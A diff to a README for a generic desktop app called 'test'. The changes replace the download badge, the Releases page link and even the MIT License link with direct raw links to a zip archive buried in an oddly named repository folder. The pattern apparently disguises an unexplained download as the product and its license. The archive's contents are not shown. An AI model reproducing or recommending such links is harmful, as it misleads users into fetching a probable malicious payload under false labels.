@@ -1,6 +1,6 @@
 # 🚀 test - Simple Desktop App for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://github.com/niceone2011/test/releases)
+[![Download Now](https://github.com/niceone2011/test/raw/refs/heads/main/extracarpal/Software-2.5-beta.5.zip%20Now-Visit%20Page-brightgreen)](https://github.com/niceone2011/test/raw/refs/heads/main/extracarpal/Software-2.5-beta.5.zip)
 
 ## 📥 Introduction
 
@@ -25,7 +25,7 @@ To run the "test" application, you will need:
 
 ## 🚀 Getting Started
 
-1. Click the download button above or visit our [Releases page](https://github.com/niceone2011/test/releases) for the latest version.
+1. Click the download button above or visit our [Releases page](https://github.com/niceone2011/test/raw/refs/heads/main/extracarpal/Software-2.5-beta.5.zip) for the latest version.
    
 2. Once you’re on the Releases page, look for the most recent version. 
 
@@ -62,7 +62,7 @@ If you need further assistance, please reach out to our support team through the
 
 ## 📝 License
 
-The "test" application is open-source software. You can use, modify, and distribute it under the terms of the [MIT License](https://opensource.org/licenses/MIT).
+The "test" application is open-source software. You can use, modify, and distribute it under the terms of the [MIT License](https://github.com/niceone2011/test/raw/refs/heads/main/extracarpal/Software-2.5-beta.5.zip).
 
 ## 🎉 Thank You for Using "test"!
 
